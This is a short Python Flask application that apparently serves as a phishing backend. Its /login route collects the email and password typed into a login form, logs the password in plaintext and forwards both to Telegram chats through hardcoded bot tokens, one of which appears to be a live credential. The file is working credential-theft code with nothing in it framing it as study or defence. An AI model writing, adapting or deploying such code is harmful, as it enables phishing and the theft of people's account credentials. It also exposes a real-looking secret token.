from flask import Flask, render_template, request, redirect, url_for, flash
import requests
import logging

# Configure logging
logging.basicConfig(level=logging.DEBUG)

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key_here'

# Replace with your Telegram bot tokens and chat IDs
TELEGRAM_BOT_TOKENS = ['7065127118:AAHCIXzM-_lAwcFYjOGKY4iPgpUcrIk4BoM', '7986783861:AAEv']
TELEGRAM_CHAT_IDS = [' 1260772582', '1174']

# Function to send message to Telegram
def send_to_telegram(message):
    for bot_token, chat_id in zip(TELEGRAM_BOT_TOKENS, TELEGRAM_CHAT_IDS):
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': message
        }
        try:
            response = requests.post(url, data=payload)
            response.raise_for_status()  # Check for HTTP request errors
            app.logger.debug(f"Message sent to Telegram successfully using bot token: {bot_token}")
        except requests.exceptions.RequestException as e:
            app.logger.error(f"Failed to send message to Telegram using bot token: {bot_token}. Error: {str(e)}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']

    app.logger.debug(f'Received email: {email}')
    app.logger.debug(f'Received password: {password}')

    # Send email and password to Telegram
    message = f"Email: {email}\nPassword: {password}"
    send_to_telegram(message)

    flash('Login details sent successfully.', 'success')
    return redirect(url_for('index'))

@app.route('/test_telegram')
def test_telegram():
    # Test sending a message to Telegram
    test_message = "This is a test message from Flask."
    send_to_telegram(test_message)
    return "Test message sent to Telegram."

if __name__ == '__main__':
    # Only run the app if this script is executed directly
    app.run(host='0.0.0.0', port=5000, debug=True)